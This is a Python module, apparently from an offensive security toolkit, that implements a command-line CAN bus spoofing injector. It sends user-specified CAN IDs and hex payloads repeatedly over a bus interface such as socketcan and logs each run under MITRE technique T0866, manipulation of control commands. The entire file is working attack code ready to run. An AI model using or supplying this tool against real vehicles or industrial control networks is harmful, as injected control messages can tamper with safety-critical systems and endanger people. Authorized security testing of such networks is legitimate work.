# modules/exploits/can_bus_spoof_injector.py

import can
import argparse
import time
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0866"  # Manipulation of Control Commands

def log_spoof(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def spoof_message(channel, interface, can_id, data, repeat, delay):
    bus = can.interface.Bus(channel=channel, bustype=interface)

    msg = can.Message(arbitration_id=can_id, data=bytes.fromhex(data), is_extended_id=False)

    for i in range(repeat):
        try:
            bus.send(msg)
            print(f"[âœ“] Spoofed CAN msg {hex(can_id)} sent ({i+1}/{repeat})")
            time.sleep(delay)
        except can.CanError as e:
            print(f"[!] Failed to send CAN message: {e}")

    log_spoof({
        "timestamp": datetime.utcnow().isoformat(),
        "channel": channel,
        "interface": interface,
        "can_id": hex(can_id),
        "data": data,
        "repeat": repeat,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CAN Bus Spoof Injector")
    parser.add_argument("--channel", required=True, help="CAN interface channel (e.g., can0)")
    parser.add_argument("--interface", default="socketcan", help="CAN interface type")
    parser.add_argument("--id", required=True, type=lambda x: int(x, 0), help="CAN ID (e.g., 0x123)")
    parser.add_argument("--data", required=True, help="Hex payload (e.g., '01FF0A00')")
    parser.add_argument("--repeat", type=int, default=1)
    parser.add_argument("--delay", type=float, default=0.5)
    args = parser.parse_args()

    spoof_message(args.channel, args.interface, args.id, args.data, args.repeat, args.delay)
